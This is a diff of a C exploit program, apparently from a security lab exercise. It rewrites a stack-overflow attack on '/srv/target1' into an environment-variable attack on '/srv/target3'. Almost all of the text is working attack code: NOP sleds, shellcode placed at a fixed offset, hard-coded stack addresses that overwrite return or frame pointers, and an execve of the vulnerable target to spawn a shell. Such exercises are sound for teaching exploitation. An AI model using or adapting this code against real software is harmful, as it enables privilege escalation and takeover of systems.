@@ -5,38 +5,32 @@
 #include <unistd.h>
 #include "shellcode.h"
 
-#define TARGET "/srv/target1"
+#define TARGET "/srv/target3"
 
-const int BUFFER_SIZE = 409;
+const int BUFFER_SIZE = 400;
 const int SHELLCODE_OFFSET = 201;
-const uint32_t RETURN_ADDRESS = 0xffffdb5c;
+const uint32_t BASE_ADDRESS = 0xffffdec0;
 
-void prepareExploit(char *buffer) {
-    memset(buffer, 0x90, BUFFER_SIZE - 1);
-    memcpy(buffer + SHELLCODE_OFFSET, shellcode, sizeof(shellcode) - 1);
+void prepareEnvironment(char *environment) {
+    memset(environment, 0x90, BUFFER_SIZE - 1);
 
-    uint32_t *ptr = (uint32_t *)(buffer + SHELLCODE_OFFSET + sizeof(shellcode) - 1);
-    uint32_t *end = (uint32_t *)(buffer + BUFFER_SIZE - 1);
-    while (ptr < end) {
-        *ptr++ = RETURN_ADDRESS;
-    }
+    uint32_t *ptr = (uint32_t *)environment;
+    *ptr++ = BASE_ADDRESS + 4;
+    *ptr++ = BASE_ADDRESS + 8;
 
-    buffer[BUFFER_SIZE - 1] = '\0';
+    memcpy(environment + SHELLCODE_OFFSET, shellcode, sizeof(shellcode));
 }
 
 int main(void)
 {
-    char *args[3];
-    char *env[1];
-    char exploitBuffer[BUFFER_SIZE];
-
-    prepareExploit(exploitBuffer);
-
-    args[0] = TARGET;
-    args[1] = exploitBuffer;
-    args[2] = NULL;
-
-    env[0] = NULL;
+    char *args[] = {
+        TARGET,
+        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xc0\xde\xff\xff",
+        NULL
+    };
+    char environment[BUFFER_SIZE] = {0};
+    prepareEnvironment(environment);
+    char *env[] = {environment, NULL};
 
     execve(TARGET, args, env);
     fprintf(stderr, "execve failed.\n");
